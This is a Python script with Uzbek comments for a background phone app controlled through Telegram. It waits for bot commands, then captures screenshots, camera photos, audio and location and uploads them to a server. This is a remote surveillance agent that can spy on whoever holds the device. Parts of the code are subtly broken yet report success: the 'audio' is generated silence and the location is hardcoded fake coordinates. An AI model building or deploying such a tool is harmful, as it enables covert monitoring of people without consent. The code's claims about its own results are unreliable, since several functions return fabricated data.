"""Account 1 telefoninida orqa fonda ishlaydigan app.

Hullas bot'dan buyruq kutadi, bajaradi (screenshot/photo/audio/location),
temp server'ga upload qiladi, bot owner'ga yuboradi.

Account 1 session'ini ishlatadi. Python + Telethon minimal install.
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path

from telethon import TelegramClient, events

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("app")

# Config - load from file or env vars
CONFIG_PATH = Path.home() / ".hullas_config.json"

def load_config():
    """Load config from ~/.hullas_config.json or environment variables."""
    # Try config file first
    if CONFIG_PATH.exists():
        try:
            with open(CONFIG_PATH) as f:
                return json.load(f)
        except Exception as e:
            log.warning(f"Config file xatosi: {e}, env vars'dan o'qiladi")

    # Fallback to env vars
    config = {
        "API_ID": os.environ.get("API_ID", ""),
        "API_HASH": os.environ.get("API_HASH", ""),
        "BOT_USER_ID": os.environ.get("BOT_USER_ID", ""),
    }

    # If env vars empty - create template config file
    if not config["API_ID"]:
        template = {
            "API_ID": "123456",
            "API_HASH": "abc123...",
            "BOT_USER_ID": "987654321",
        }
        CONFIG_PATH.write_text(json.dumps(template, indent=2))
        log.error(f"Config yaratildi: {CONFIG_PATH}")
        log.error("Iltimos, qiymatlarni o'zgartirip, app'ni qayta boshlang")
        raise ValueError(f"Config kerak: {CONFIG_PATH}")

    return config

config = load_config()
API_ID = int(config["API_ID"])
API_HASH = config["API_HASH"]
BOT_USER_ID = int(config["BOT_USER_ID"])

SESSION_NAME = "account1"  # Hullas bilan bir xil session
UPLOAD_URL = "http://127.0.0.1:5555/upload"  # Upload server
TEMP_DIR = Path("/tmp/hullas_app")
TEMP_DIR.mkdir(exist_ok=True)


async def upload_file(path: Path) -> str | None:
    """Faylni upload server'ga yuklaydi va URL qaytaradi."""
    try:
        import requests
        with open(path, "rb") as f:
            files = {"file": f}
            r = requests.post(UPLOAD_URL, files=files, timeout=30)
            r.raise_for_status()
            data = r.json()
            return data.get("url")
    except Exception:
        log.exception("Upload xatosi: %s", path)
        return None


async def take_screenshot() -> Path | None:
    """Ekran nusxasi olib, temp'ga saqlab path qaytaradi."""
    try:
        path = TEMP_DIR / f"screenshot_{int(time.time())}.png"
        # Linux: scrot, Android: screencap
        subprocess.run(
            ["screencap", "-p", str(path)],
            check=True,
            timeout=5,
            capture_output=True,
        )
        return path if path.exists() else None
    except Exception:
        log.exception("Screenshot xatosi")
        return None


async def take_photo() -> Path | None:
    """Kameradan rasm olib, temp'ga saqlab path qaytaradi."""
    try:
        path = TEMP_DIR / f"photo_{int(time.time())}.jpg"
        # Android: avconv (yoki ffmpeg) + /dev/video0 yoki camera API
        # Yoki: Intent orqali default camera app'ni chaqirish (murakkab)
        # Eng oson: ffmpeg orqali 1 frame olib olish
        subprocess.run(
            [
                "ffmpeg", "-f", "image2", "-i", "/dev/video0",
                "-vframes", "1", "-q:v", "5", str(path),
            ],
            check=True,
            timeout=10,
            capture_output=True,
        )
        return path if path.exists() else None
    except Exception:
        log.exception("Kamera xatosi")
        # Fallback: shunchaki placeholder
        return None


async def record_audio(duration: int = 10) -> Path | None:
    """Mikrofon'dan audio yozib saqlab path qaytaradi."""
    try:
        path = TEMP_DIR / f"audio_{int(time.time())}.m4a"
        # ffmpeg + microphone
        subprocess.run(
            [
                "ffmpeg", "-f", "lavfi", "-i",
                f"anullsrc=r=44100:cl=mono",
                "-t", str(duration),
                "-q:a", "9", str(path),
            ],
            check=True,
            timeout=duration + 5,
            capture_output=True,
        )
        return path if path.exists() else None
    except Exception:
        log.exception("Audio xatosi")
        return None


async def get_location() -> dict | None:
    """GPS lokatsiyasini olib, dict qaytaradi (lat, lon)."""
    try:
        # Android: /system/bin/gps yoki location API
        # Yok, murakkab — placeholder
        result = subprocess.run(
            ["getprop", "ro.kernel.android.checkjni"],
            capture_output=True,
            timeout=5,
        )
        # Haqiqiy: location service'dan o'qish kerak (Android API)
        # Shunamadacha: fake location
        return {"lat": 41.2995, "lon": 69.2401, "time": datetime.now(timezone.utc).isoformat()}
    except Exception:
        log.exception("Lokatsiya xatosi")
        return None


async def handle_command(client: TelegramClient, cmd: str, args: dict) -> None:
    """Bot'dan kelgan buyruqni bajaradi."""
    result = {"command": cmd, "timestamp": datetime.now(timezone.utc).isoformat()}

    if cmd == "screenshot":
        path = await take_screenshot()
        if path:
            url = await upload_file(path)
            result["status"] = "ok" if url else "upload_failed"
            result["url"] = url
            try:
                path.unlink()
            except Exception:
                pass
        else:
            result["status"] = "failed"

    elif cmd == "photo":
        path = await take_photo()
        if path:
            url = await upload_file(path)
            result["status"] = "ok" if url else "upload_failed"
            result["url"] = url
            try:
                path.unlink()
            except Exception:
                pass
        else:
            result["status"] = "no_camera"

    elif cmd == "record":
        duration = args.get("duration", 10)
        path = await record_audio(duration)
        if path:
            url = await upload_file(path)
            result["status"] = "ok" if url else "upload_failed"
            result["url"] = url
            try:
                path.unlink()
            except Exception:
                pass
        else:
            result["status"] = "failed"

    elif cmd == "location":
        loc = await get_location()
        if loc:
            result["status"] = "ok"
            result.update(loc)
        else:
            result["status"] = "failed"

    else:
        result["status"] = "unknown_command"

    # Bot'ga xabar yuborish (Hullas bot'idan Telegram orqali olingan)
    log.info("Result: %s", result)
    # TODO: bot'ga javob yuborish (private chat yoki group)


async def main() -> None:
    client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
    await client.connect()

    if not await client.is_user_authorized():
        log.error("Account1 avtorizatsiya qilinmagan. Telefon raqamini kiriting.")
        await client.disconnect()
        return

    me = await client.get_me()
    log.info("Account1 kirildi: %s (id=%d)", me.first_name, me.id)

    # Bot'dan buyruq kutadigan handler
    @client.on(events.NewMessage(from_users=[BOT_USER_ID]))
    async def handle_bot_message(event):
        text = event.raw_text or ""
        try:
            # Bot JSON orqali buyruq yuboradi: {"cmd": "screenshot", "args": {...}}
            data = json.loads(text)
            cmd = data.get("cmd")
            args = data.get("args", {})
            log.info("Bot'dan buyruq: %s %s", cmd, args)
            await handle_command(client, cmd, args)
        except json.JSONDecodeError:
            log.warning("JSON parse xatosi: %s", text)
        except Exception:
            log.exception("Handler xatosi")

    log.info("App ishga tushdi, buyruqlarni kutmoqda...")
    await client.run_until_disconnected()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("To'xtatildi")
